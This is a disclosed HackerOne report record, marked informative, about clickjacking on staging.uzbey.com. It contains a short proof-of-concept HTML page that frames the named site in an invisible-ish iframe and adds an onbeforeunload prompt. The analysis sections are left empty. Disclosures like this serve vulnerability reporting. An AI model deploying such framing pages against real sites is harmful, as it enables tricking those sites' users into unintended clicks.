---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '17315'
original_report_id: '17315'
title: Clickjacking at https://staging.uzbey.com/
weakness: UI Redressing (Clickjacking)
team_handle: uzbey
created_at: '2014-06-23T11:46:47.674Z'
disclosed_at: '2014-08-07T18:54:30.560Z'
has_bounty: false
visibility: full
substate: informative
vote_count: 1
tags:
- hackerone
- ui-redressing-clickjacking
---

# Clickjacking at https://staging.uzbey.com/

## Metadata

- HackerOne Report ID: 17315
- Weakness: UI Redressing (Clickjacking)
- Program: uzbey
- Disclosed At: 2014-08-07T18:54:30.560Z
- Has Bounty: No
- Visibility: full
- Substate: informative

## Original Report

hi, i found your site is vulnerable to clickjacking.
poc:    
<html><head>
<title>  testing </title>
<style>

frame {

opacity: 0.5;
border: none;
position: absolute;
top: 0px;
left: 0px;
z-index: 1000;
}
</style>
</head>
<body>
<script>
   window.onbeforeunload = function()
   {
      return " Do you want to leave ?";
   }
</script>
<p> site is vulnerable for Clickjacking! by Vineet bhardwaj</p>
<iframe id="frame" width="100%" height="100%" src="https://staging.uzbey.com/"></iframe>
</body>
</html>


please check the attachment ...

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
